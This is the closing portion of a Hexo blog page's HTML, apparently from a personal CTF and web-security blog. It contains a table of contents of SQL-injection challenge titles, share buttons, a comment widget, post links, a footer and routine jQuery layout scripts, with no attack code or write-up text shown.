toc-level-2"><a class="toc-link" href="#简单的sql注入"><span class="toc-number">21.</span> <span class="toc-text">简单的sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的sql注入之2"><span class="toc-number">22.</span> <span class="toc-text">简单的sql注入之2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的sql注入之3"><span class="toc-number">23.</span> <span class="toc-text">简单的sql注入之3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#因缺思汀的绕过"><span class="toc-number">24.</span> <span class="toc-text">因缺思汀的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#who-are-you"><span class="toc-number">25.</span> <span class="toc-text">who are you?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登陆一下好吗"><span class="toc-number">26.</span> <span class="toc-text">登陆一下好吗??</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'Archimesan',
+      repo: 'archimesan.github.io',
+      oauth: {
+        client_id: '',
+        client_secret: '',
+      },
+    })
+    gitment.render('gitments')
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2018/01/30/西普实验吧-密码学/" title="下一篇: 西普实验室—-密码学">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/02/01/西普实验吧-web/">西普实验吧-web</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/西普实验吧-密码学/">西普实验室—-密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/29/磁盘分区恢复/">磁盘分区恢复</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/28/快速抓取网页内容/">快速抓取网页内容</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/25/序列化漏洞/">序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/24/MD5爆破问题/">MD5 爆破问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/23/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/22/CBC字节翻转攻击/">CBC字节翻转攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/php弱类型漏洞/">php弱类型漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/20/RSA归纳/">RSA归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/19/文件包含漏洞/">文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/18/文件上传绕过/">文件上传绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/17/XSS归纳/">XSS归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/16/SQL注入学习/">SQL注入学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/2017湖湘杯/">2017湖湘杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/14/CTF学习/">CTF学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/13/burpsuite/">BurpSuite 永久使用版（附下载）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/12/搭建hexo/">搭建hexo</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/12/hexo/">Hexo的使用介绍</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2018 Archimesan
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
